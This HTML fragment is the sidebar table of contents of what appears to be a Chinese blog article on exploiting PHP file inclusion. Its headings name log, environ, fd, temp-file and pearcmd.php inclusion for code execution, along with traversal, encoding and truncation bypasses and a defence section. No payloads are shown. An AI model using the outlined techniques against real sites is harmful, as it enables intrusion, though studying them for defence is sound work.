class="toc-text"> 包含日志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97"><span class="toc-text"> 访问日志</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4"><span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E4%BD%8D%E7%BD%AE"><span class="toc-text"> 日志位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload%E6%8F%92%E5%85%A5"><span class="toc-text"> payload插入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-log"><span class="toc-text"> SSH log</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5"><span class="toc-text"> 利用条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABenviron%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text"> 包含environ（环境变量）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6"><span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-text"> 利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABfd"><span class="toc-text"> 包含fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text"> 包含临时文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text"> 包含上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABpearcmd"><span class="toc-text"> 包含pearcmd</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pearcmdphp-%E5%8F%AF%E8%83%BD%E7%9A%84%E8%B7%AF%E5%BE%84"><span class="toc-text"> pearcmd.php 可能的路径</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#linux"><span class="toc-text"> Linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#windowsxampp"><span class="toc-text"> Windows（XAMPP）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-text"> 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%8C%85%E5%90%AB-pearcmdphp-%E8%BF%9B%E8%A1%8C-rce"><span class="toc-text"> 直接包含 pearcmd.php 进行 RCE</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%93%E5%90%88-phpinput-%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text"> 结合 php:&#x2F;&#x2F;input 进行代码执行</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%93%E5%90%88-sessionauto_start-%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text"> 结合 session.auto_start 进行代码执行</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-text"> 绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80"><span class="toc-text"> 指定前缀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text"> 目录遍历</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text"> 编码绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80"><span class="toc-text"> 指定后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#url"><span class="toc-text"> URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text"> 使用协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text"> 长度截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD"><span class="toc-text"> 0字节截断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%89%8D%E5%90%8E%E7%BC%80"><span class="toc-text"> 指定前后缀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-text"> 防御方案</span></a></li></ol></li></ol></div><div class="widget-footer">
 
 <a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel blur'>
